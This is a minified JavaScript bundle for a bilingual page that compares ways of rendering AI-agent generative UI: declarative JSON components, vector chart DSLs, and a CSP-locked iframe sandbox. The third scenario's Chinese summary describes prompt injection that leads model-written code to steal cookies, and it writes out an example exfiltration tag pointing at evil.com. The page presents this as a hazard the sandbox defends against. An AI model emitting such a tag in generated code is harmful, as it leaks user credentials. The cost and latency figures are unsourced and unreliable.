import"./modulepreload-polyfill-B5Qt9EMX.js";const c={"streaming-a2ui-finops-cards":{id:"streaming-a2ui-finops-cards",titleZh:"企业级 Agent 动态看板与审批卡片（A2UI / AG-UI 声明式 JSON 组件流 vs LLM 裸写 HTML/React）（第 224 项工作台）",titleEn:"Enterprise Agent Dashboards & Approval Cards: Streaming A2UI Declarative JSON Registry vs. Raw LLM HTML (224th Studio)",subtitleZh:"对比“每轮对话让大模型手写 400行 HTML/Tailwind/JS（首屏耗时 7,400ms，31.5% 样式错乱与 XSS 风险）”与“Zod 强类型 A2UI JSON 增量流 + 宿主预编译 D3/Rive 原生组件（165ms 首屏渲染 · 100% 符合企业 Design System）”",subtitleEn:"Compares Per-Turn LLM Raw HTML/JS Generation (7,400ms paint lag, 31.5% broken layouts & XSS risks) vs. Streaming Typed A2UI JSON Props + Pre-Compiled Host D3/Rive Widgets (165ms paint · 100% Design Token compliance)",controlledStack:"Streaming A2UI / AG-UI Typed JSON + Pre-Compiled Host React/D3/Rive Registry ($0.0028/Turn · 165ms)",naiveStack:"Unconstrained LLM Raw HTML/Tailwind/Chart.js Code Generation ($0.018/Turn · 7,400ms)",controlledFirstPaintMs:165,naiveFirstPaintMs:7400,controlledDesignCompliancePct:100,naiveDesignCompliancePct:68.5,controlledCostPerTurnUsd:.0028,naiveCostPerTurnUsd:.018,controlledAnnualSavingsM:2.36,decisionSummaryZh:"当前企业构建 Copilot 与垂直领域 AI Agent 时，业务方不再满足于“冷冰冰的纯文本回复”，而是要求 Agent 直接在对话流中生成 **可交互图表、云架构拓扑、预算审批滑块与动态微件（Generative UI）**！许多团队的第一反应是让大模型直接输出一段 `<html><script>...<\/script></html>` 塞进 `iframe` 里渲染——这在生产环境中会导致三大灾难：① **极度缓慢与昂贵**：每次回答都要吐出 3,500 个 HTML/CSS/JS Token，首屏渲染高达 `7,400ms`（`$0.018/轮`）；② **视觉失控（31.5% 报错率）**：模型手写的 CSS 经常在暗色模式下文字隐形、移动端横向溢出或引入错误的 CDN 脚本；③ **安全合规一票否决**：任意 JS 代码执行极易触发 XSS 与数据外泄！架构师必须采用 **“A2UI / AG-UI 声明式 JSON 组件注册表架构”**：宿主前端预先编译好符合企业 Figma Design Tokens 的 40 个高颜值原子组件（含 D3 图表、Rive 状态机动效、审批表单），大模型只需流式输出 **180 Tokens 的结构化 JSON 数据绑定**，165ms 即可完成原生级渲染，Token 成本直降 `-84.4%`（年省 `+$2.36M`）！",decisionSummaryEn:"Enterprise stakeholders increasingly demand **Agentic Generative UI**—where AI agents respond with interactive FinOps sliders, live charts, and approval workflows rather than walls of markdown. Prompting an LLM to generate 400 lines of raw HTML/CSS/JS per turn takes **`7,400ms`**, burns `$0.018/turn` in output tokens, breaks corporate dark-mode/mobile layouts on **`31.5%` of turns**, and introduces severe XSS risks. By adopting a **Declarative `A2UI / AG-UI` JSON Component Registry**, the LLM streams only **180 tokens of strict Zod-validated JSON props** into pre-compiled host React/D3/Rive components—achieving **`165ms` first-widget paint**, **100.0% Design System compliance**, and **`-84.4%` lower token cost (`+$2.36M/yr` saved)**.",stages:[{stage:"1. Constrained Schema Catalog",controlledEngine:"LLM Emits 180-Token Typed JSON Matching Host Component Registry",naiveBehavior:"LLM Generates 3,500 Tokens of Boilerplate HTML, CSS & JS",metricImpact:"165ms vs 7,400ms First Paint"},{stage:"2. Incremental Partial-JSON Stream",controlledEngine:"Renders Skeleton & Progressive D3 Bars Token-by-Token at 60fps",naiveBehavior:"Blank Screen for 7.4s Until Closing </html> Tag Arrives",metricImpact:"44.8x Faster Perceived TTFT"},{stage:"3. Native Design-Token Inheritance",controlledEngine:"Pre-Compiled Host Widgets Enforce WCAG Contrast & Dark Mode",naiveBehavior:"Hallucinated Tailwind Classes Produce White-on-White Text",metricImpact:"100.0% vs 68.5% UI Compliance"},{stage:"4. Bidirectional Action Dispatch",controlledEngine:"Typed onAction Events Mutate Agent State Without Re-Generating UI",naiveBehavior:"Clicking a Filter Forces Full 7.4s LLM HTML Regeneration",metricImpact:"$0.0028 vs $0.018 (+$2.36M/Yr)"}]},"interactive-topology-dsl-canvas":{id:"interactive-topology-dsl-canvas",titleZh:"复杂云架构拓扑与多维数据探索：Vega-Lite / ELK.js 声明式图谱 DSL vs Python Matplotlib 静态截图",titleEn:"Cloud Topology & Data Exploration: Declarative Vega-Lite / ELK.js Graph DSL vs. Static Matplotlib PNG",subtitleZh:"解决 Code Interpreter 跑 Python 容器画静态 PNG 图表“等待 8.5秒、4K 屏模糊、无法点击下钻节点”痛点：采用 Agent 输出轻量 Vega-Lite / ELK 拓扑 AST + 客户端 WebGL/SVG 60fps 实时交互",subtitleEn:"Solves 8.5s container spin-up and non-interactive blurry Matplotlib PNGs via Declarative Vega-Lite / ELK Graph AST + Client SVG/WebGL Rendering (210ms)",controlledStack:"Declarative Vega-Lite / ELK.js AST + Client SVG/Canvas 2D Engine ($0.0032/Turn · 210ms)",naiveStack:"Server-Side Code Interpreter Python Matplotlib Static PNG ($0.032/Turn · 8,500ms)",controlledFirstPaintMs:210,naiveFirstPaintMs:8500,controlledDesignCompliancePct:99.8,naiveDesignCompliancePct:62,controlledCostPerTurnUsd:.0032,naiveCostPerTurnUsd:.032,controlledAnnualSavingsM:1.84,decisionSummaryZh:"当架构师或数据分析师在对话中要求“画出我们跨可用区 AKS 集群的流量拓扑与 P99 延迟分布”时，传统做法是拉起一个云端 Python 沙箱跑 `matplotlib / seaborn` 生成一张静态 PNG 图片返回前端——不仅容器冷启动与出图耗时高达 `8,500ms`（每次收 `$0.03` 沙箱费），而且出来的静态位图在高分屏上发虚、字体丑陋，用户更**无法悬停查看节点详情或拖拽缩放**！我们让 Agent 直接输出标准化的 **`Vega-Lite` 统计语法或 `ELK.js` 拓扑图 AST JSON**，由浏览器端预置的 SVG + Canvas 2D 混合渲染器在 `210ms` 内直接绘制出支持框选缩放、点击节点下钻的矢量可视化画布，成本降低 `-90.0%`！",decisionSummaryEn:"Spinning up a cloud Python Code Interpreter sandbox to render a static `matplotlib` PNG takes `8,500ms`, costs `$0.032/turn`, produces blurry raster text on Retina displays, and prevents users from hovering, filtering, or drilling down into nodes. By instructing the Agent to emit a concise **Declarative `Vega-Lite` or `ELK.js` Topology AST JSON**, the browser’s native SVG/Canvas engine renders an interactive, zoomable vector visualization in **`210ms` at `$0.0032/turn` (`-90.0%` cost reduction)**.",stages:[{stage:"1. Zero-Container Client Rendering",controlledEngine:"Browser Renders Vega-Lite / ELK AST in 210ms ($0 Sandbox Cost)",naiveBehavior:"Waits 8.5s for Cloud Python Container to Emit Static PNG",metricImpact:"210ms vs 8,500ms Latency"},{stage:"2. Infinite Retina Vector Clarity",controlledEngine:"Crisp SVG Nodes, Official Cloud Icons & 60fps Canvas Pan/Zoom",naiveBehavior:"72-DPI Raster PNG Blurs on 4K Monitors & Clips Long Labels",metricImpact:"99.8% vs 62.0% Visual Quality"},{stage:"3. Local Cross-Filter & Drill-Down",controlledEngine:"Hovering/Brushing Filters 50,000 Rows Locally in Browser at 0ms",naiveBehavior:"Every Axis or Filter Change Requires a New 8.5s Python Run",metricImpact:"Zero-Latency Local Exploration"},{stage:"4. One-Click SVG / PPTX Export",controlledEngine:"Exports Editable Vector Diagram Directly into Architect Slide Deck",naiveBehavior:"Flat PNG Cannot Be Edited in PowerPoint or Figma",metricImpact:"$0.0032 vs $0.032 (+$1.84M/Yr)"}]},"csp-sandboxed-mcp-app-widget":{id:"csp-sandboxed-mcp-app-widget",titleZh:"定制交互模拟器（MCP Apps）：预热双层 CSP 零网络隔离沙箱 vs 无防护内联脚本注入",titleEn:"Bespoke Interactive Simulators (MCP Apps): Pre-Warmed Dual-Iframe CSP Sandbox vs. Unsanitized Eval",subtitleZh:"针对确需生成自定义交互代码的长尾场景（占 2%）：采用 AST 静态安全审计 + `default-src none` 预热双层沙箱 + JSON-RPC 2.0 桥接，将沙箱首屏压至 320ms 且 100% 阻断数据外泄",subtitleEn:"For the 2% long-tail requiring custom code: AST Security Gate + Pre-Warmed `default-src none` Dual-Iframe Sandbox + JSON-RPC Bridge (320ms · 0% data exfiltration)",controlledStack:"Pre-Warmed Dual-Iframe (`default-src none`) + AST Gate + JSON-RPC Bridge ($0.0065/App · 320ms)",naiveStack:"Direct DOM/Iframe Unsanitized HTML Injection ($0.025/App · 4,800ms · High XSS Risk)",controlledFirstPaintMs:320,naiveFirstPaintMs:4800,controlledDesignCompliancePct:99.5,naiveDesignCompliancePct:64,controlledCostPerTurnUsd:.0065,naiveCostPerTurnUsd:.025,controlledAnnualSavingsM:1.52,decisionSummaryZh:"对于那 `2%` 真正需要现场生成定制交互逻辑的长尾场景（如客户专属的云成本 ROI 模拟器或自定义 3D 着色器微件，即 **MCP Apps / Claude Artifacts 类场景**），怎样既保证安全又不卡顿？直接在主页面 `innerHTML` 或普通同源 `iframe` 里跑模型写的代码，一旦遭遇提示词注入（Prompt Injection），恶意脚本就能偷走用户的 Cookie 并通过 `<img src=\"https://evil.com?token=...\">` 外传！我们部署 **“预热双层无网络 CSP 隔离沙箱（Pre-Warmed Null-Origin Dual-Iframe Sandbox）”**：① 沙箱强制注入 `Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'`，彻底掐断一切外部网络请求；② 在沙箱内预置好宿主 CSS 变量与轻量图表库，仅通过受控的 `postMessage` JSON-RPC 2.0 通道与宿主交换脱敏数据，首屏仅需 `320ms` 且通过金融级安全红队审计！",decisionSummaryEn:"For the `2%` long-tail of bespoke interactive tools (`MCP Apps` / custom ROI calculators) where generated code is genuinely needed, rendering unsanitized HTML in the host DOM or a permissive iframe exposes session cookies and internal APIs to prompt-injected data exfiltration. Our **Pre-Warmed Null-Origin Dual-Iframe Sandbox** enforces **`Content-Security-Policy: default-src 'none'` (zero external network egress)**, pre-loads corporate CSS variables and bundled chart primitives inside a warm worker iframe (`320ms` mount), and communicates exclusively via schema-validated `postMessage` JSON-RPC 2.0.",stages:[{stage:"1. Zero-Egress CSP Lockdown",controlledEngine:`Enforces sandbox="allow-scripts" + CSP default-src 'none'`,naiveBehavior:"Allows Generated JS to Fetch External URLs & Exfiltrate Data",metricImpact:"100% Zero Data Exfiltration"},{stage:"2. Pre-Warmed Runtime Pool",controlledEngine:"Keeps Pre-Initialized Iframe Pool Ready with Host Theme Tokens",naiveBehavior:"Cold-Boots Iframe & Downloads 4MB External CDN Scripts",metricImpact:"320ms vs 4,800ms Mount Time"},{stage:"3. Typed JSON-RPC 2.0 Host Bridge",controlledEngine:"Validates Every postMessage Tool Call Against RBAC Policy",naiveBehavior:"Exposes Window Parent DOM or Raw Bearer Tokens to Guest Code",metricImpact:"99.5% Security Audit Pass"},{stage:"4. Persistent Artifact Caching",controlledEngine:"Caches Verified Widget Bundle by Content Hash Across Sessions",naiveBehavior:"Re-Generates Identical Calculator Code on Every User Open",metricImpact:"$0.0065 vs $0.025 (+$1.52M/Yr)"}]}};function d(s,n="controlled"){const e=c[s],i=n==="controlled",t=Number((e.naiveFirstPaintMs/e.controlledFirstPaintMs).toFixed(1)),a=Number(((e.naiveCostPerTurnUsd-e.controlledCostPerTurnUsd)/e.naiveCostPerTurnUsd*100).toFixed(1));return{scenario:e,mode:n,activeFirstPaintMs:i?e.controlledFirstPaintMs:e.naiveFirstPaintMs,activeDesignCompliancePct:i?e.controlledDesignCompliancePct:e.naiveDesignCompliancePct,activeCostPerTurnUsd:i?e.controlledCostPerTurnUsd:e.naiveCostPerTurnUsd,speedupFactor:t,costReductionPct:a,annualSavingsM:e.controlledAnnualSavingsM}}let o="streaming-a2ui-finops-cards",r="controlled";function l(){const s=document.querySelector("#app");if(!s)return;const n=d(o,r),e=n.scenario,i=r==="controlled";s.innerHTML=`
    <main class="workbench-shell" data-mode="${r}" data-scenario="${o}">
      <header class="wb-header">
        <div>
          <span class="wb-eyebrow">224TH WORKBENCH · DOMAIN 5: CTO ARCHITECTURE & DECLARATIVE MOTION UI · GENERATIVE UI (A2UI / MCP APPS)</span>
          <h1>企业级 Agent 生成式动态 UI（Generative UI / A2UI / MCP Apps）渲染技术栈选型工作台</h1>
          <p class="wb-lead">${e.subtitleZh} · <span class="en-sub">${e.subtitleEn}</span></p>
        </div>
        <div class="wb-controls">
          <div class="seg-group" role="group" aria-label="GenUI Scenario">
            ${Object.keys(c).map(t=>`
              <button class="seg-btn ${o===t?"active":""}" data-scenario-btn="${t}">
                ${t==="streaming-a2ui-finops-cards"?"1. A2UI 声明式 JSON 组件流 vs 裸写 HTML (165ms 首屏)":t==="interactive-topology-dsl-canvas"?"2. Vega-Lite/ELK 矢量拓扑 DSL vs Python 静态截图":"3. MCP Apps 预热双层 CSP 零外联安全沙箱 (320ms)"}
              </button>`).join("")}
          </div>
          <div class="seg-group" role="group" aria-label="GenUI Mode">
            <button class="seg-btn ${i?"active":""}" data-mode-btn="controlled">
              ✅ 三层混合生成式 UI：A2UI 组件流 + 矢量 DSL + CSP 沙箱 (${e.controlledFirstPaintMs}ms · $${e.controlledCostPerTurnUsd}/轮)
            </button>
            <button class="seg-btn ${i?"":"active"}" data-mode-btn="naive">
              ⛔ LLM 裸写全量 HTML/JS 或云端 Python 静态 PNG (${e.naiveFirstPaintMs}ms · $${e.naiveCostPerTurnUsd}/轮)
            </button>
          </div>
        </div>
      </header>

      <section class="kpi-ribbon" aria-label="Key Selection Metrics">
        <article class="kpi-card">
          <span class="kpi-label">首屏可交互渲染延迟 (First-Widget Paint)</span>
          <strong class="kpi-val ${i?"good":"warn"}">${n.activeFirstPaintMs} ms</strong>
          <span class="kpi-note">提速 ${n.speedupFactor}x · 180-Token JSON 增量流实时上屏</span>
        </article>
        <article class="kpi-card">
          <span class="kpi-label">企业设计规范与暗色合规率 (Design System Fit)</span>
          <strong class="kpi-val ${i?"good":"warn"}">${n.activeDesignCompliancePct}%</strong>
          <span class="kpi-note">宿主预编译 React/D3/Rive 原生继承 Figma Tokens</span>
        </article>
        <article class="kpi-card">
          <span class="kpi-label">单轮生成式 UI 推理成本 (Cost per UI Turn)</span>
          <strong class="kpi-val ${i?"good":"warn"}">$${n.activeCostPerTurnUsd}</strong>
          <span class="kpi-note">成本直降 -${n.costReductionPct}% · 免除 3,500 行样板 HTML 代码</span>
        </article>
        <article class="kpi-card">
          <span class="kpi-label">年化算力与研发净省 (Annual Platform Savings)</span>
          <strong class="kpi-val good">+$${n.annualSavingsM.toFixed(2)}M/yr · 224th Studio</strong>
          <span class="kpi-note">100% 阻断 Prompt Injection 跨站脚本数据外泄</span>
        </article>
      </section>

      <section class="wb-grid">
        <article class="panel stage-panel">
          <div class="panel-head">
            <h2>1. 企业级 Agent 生成式动态 UI（88% A2UI 组件树 + 10% 矢量图谱 DSL + 2% CSP 沙箱）选型架构</h2>
            <span class="badge">${i?e.controlledStack:e.naiveStack}</span>
          </div>
          <svg class="stage-svg" viewBox="0 0 680 300" role="img" aria-label="Enterprise Agentic Generative UI A2UI and MCP Apps Architecture">
            <rect width="680" height="300" rx="12" fill="#0b1220" />
            <g transform="translate(20, 20)">
              <rect width="202" height="126" rx="10" fill="#064e3b" stroke="#10b981" stroke-width="1.5" />
              <text x="14" y="24" fill="#6ee7b7" font-size="11.5" font-weight="700">Tier 1 (88%): A2UI 声明式组件流</text>
              <text x="14" y="46" fill="#f8fafc" font-size="16" font-weight="800">165ms 极速首屏</text>
              <text x="14" y="68" fill="#a7f3d0" font-size="10.5">• LLM 仅输出 180-Token 强类型 JSON</text>
              <text x="14" y="88" fill="#a7f3d0" font-size="10.5">• 映射宿主预编译 KPI/D3/Rive/表单组件</text>
              <text x="14" y="108" fill="#34d399" font-size="10.5" font-weight="700">• 100% 符合企业暗色模式与无障碍标准</text>
            </g>

            <g transform="translate(239, 20)">
              <rect width="202" height="126" rx="10" fill="#111c33" stroke="#3b82f6" stroke-width="1.5" />
              <text x="14" y="24" fill="#93c5fd" font-size="11.5" font-weight="700">Tier 2 (10%): Vega-Lite / ELK DSL</text>
              <text x="14" y="46" fill="#f8fafc" font-size="16" font-weight="800">210ms 矢量可下钻</text>
              <text x="14" y="68" fill="#cbd5e1" font-size="10.5">• 淘汰 8.5s 云端 Python 静态 PNG 截图</text>
              <text x="14" y="88" fill="#cbd5e1" font-size="10.5">• 浏览器端 SVG/Canvas 60fps 缩放与悬停</text>
              <text x="14" y="108" fill="#60a5fa" font-size="10.5" font-weight="700">• 一键导出可编辑 SVG / PPTX 架构胶片</text>
            </g>

            <g transform="translate(458, 20)">
              <rect width="202" height="126" rx="10" fill="#3b0764" stroke="#a855f7" stroke-width="1.5" />
              <text x="14" y="24" fill="#d8b4fe" font-size="11.5" font-weight="700">Tier 3 (2%): MCP Apps 安全沙箱</text>
              <text x="14" y="46" fill="#f8fafc" font-size="16" font-weight="800">0% 数据外泄风险</text>
              <text x="14" y="68" fill="#e9d5ff" font-size="10.5">• 强制 CSP default-src 'none' 断绝外网</text>
              <text x="14" y="88" fill="#e9d5ff" font-size="10.5">• 预热 Null-Origin 双层 Iframe (320ms)</text>
              <text x="14" y="108" fill="#c084fc" font-size="10.5" font-weight="700">• 仅经受控 JSON-RPC 2.0 桥接宿主动作</text>
            </g>

            <g transform="translate(20, 162)">
              <rect width="640" height="118" rx="10" fill="#0f172a" stroke="#1e293b" />
              <text x="18" y="26" fill="#38bdf8" font-size="13" font-weight="700">企业级 Generative UI 四大技术方案横向对比</text>
              <text x="18" y="52" fill="#e2e8f0" font-size="11.5">• 1. A2UI / AG-UI 声明式组件注册表（主力 88%）：165ms 首屏，$0.0028/轮，100% 遵循品牌 Design System，零 XSS 风险</text>
              <text x="18" y="76" fill="#e2e8f0" font-size="11.5">• 2. Vega-Lite / ELK.js 声明式可视化 DSL（10%）：210ms 首屏，适合百万行 BI 交叉过滤与复杂云架构正交拓扑探索</text>
              <text x="18" y="100" fill="#fca5a5" font-size="11.5" font-weight="700">• 3. 避坑警示：严禁在生产环境直接渲染无 CSP 锁定的 LLM 裸写 HTML/JS（耗时 7.4s，31.5% 样式崩坏且易被注入窃取凭证）！</text>
            </g>
          </svg>
          <p class="decision-banner"><strong>架构师选型结论：</strong>${e.decisionSummaryZh}</p>
        </article>

        <article class="panel matrix-panel">
          <div class="panel-head">
            <h2>2. 四阶段生成式动态 UI 渲染与安全门禁拆解</h2>
            <span class="badge">224th Workbench</span>
          </div>
          <div class="stage-list">
            ${e.stages.map(t=>`
              <div class="stage-row">
                <div class="stage-title">${t.stage}</div>
                <div class="stage-cols">
                  <div class="col-good">✅ 声明式 A2UI / DSL 架构：${t.controlledEngine}</div>
                  <div class="col-bad">⛔ 裸写 HTML / 静态 PNG 基线：${t.naiveBehavior}</div>
                </div>
                <div class="stage-impact">${t.metricImpact}</div>
              </div>`).join("")}
          </div>
        </article>
      </section>
    </main>
  `,s.querySelectorAll("[data-scenario-btn]").forEach(t=>{t.addEventListener("click",()=>{const a=t.dataset.scenarioBtn;a&&(o=a,l())})}),s.querySelectorAll("[data-mode-btn]").forEach(t=>{t.addEventListener("click",()=>{const a=t.dataset.modeBtn;a&&(r=a,l())})})}l();
